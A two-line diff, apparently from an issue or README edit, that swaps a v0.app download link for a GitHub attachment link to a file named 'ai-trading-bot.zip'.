@@ -1,1 +1,2 @@
-https://v0.app/chat/api/download-zip?id=b_1HTeW0YlkEq
+
+[ai-trading-bot.zip](https://github.com/user-attachments/files/21958967/ai-trading-bot.zip)
